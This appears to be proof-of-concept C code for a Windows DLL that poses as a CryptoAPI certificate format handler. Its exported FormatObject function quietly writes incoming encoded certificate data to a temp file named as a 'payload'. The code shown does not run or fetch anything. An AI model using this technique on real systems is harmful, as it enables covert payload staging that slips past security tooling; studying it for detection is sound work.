#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

static LONG g_wrote_payload = 0;

static void write_payload_once(const BYTE *pbEncoded, DWORD cbEncoded) {
    char temp_path[MAX_PATH];
    char out_path[MAX_PATH];
    HANDLE file_handle;
    DWORD written = 0;
    size_t path_len;

    if (pbEncoded == NULL || cbEncoded == 0) {
        return;
    }

    if (GetTempPathA(MAX_PATH, temp_path) == 0) {
        return;
    }

    path_len = lstrlenA(temp_path);
    if (path_len == 0) {
        return;
    }

    if (snprintf(out_path, sizeof(out_path), "%sformat_ghost_payload.bin", temp_path) < 0) {
        return;
    }

    file_handle = CreateFileA(
        out_path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (file_handle == INVALID_HANDLE_VALUE) {
        return;
    }

    WriteFile(file_handle, pbEncoded, cbEncoded, &written, NULL);
    CloseHandle(file_handle);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    (void)hinstDLL;
    (void)fdwReason;
    (void)lpReserved;
    return TRUE;
}

__declspec(dllexport)
BOOL WINAPI FormatObject(
    DWORD dwCertEncodingType,
    DWORD dwFormatType,
    DWORD dwFormatStrType,
    void *pFormatStruct,
    LPCSTR lpszStructType,
    const BYTE *pbEncoded,
    DWORD cbEncoded,
    void *pbFormat,
    DWORD *pcbFormat
) {
    (void)dwCertEncodingType;
    (void)dwFormatType;
    (void)dwFormatStrType;
    (void)pFormatStruct;
    (void)lpszStructType;
    (void)pbFormat;
    (void)pcbFormat;

    if (InterlockedCompareExchange(&g_wrote_payload, 1, 0) == 0) {
        write_payload_once(pbEncoded, cbEncoded);
    }

    return FALSE;
}
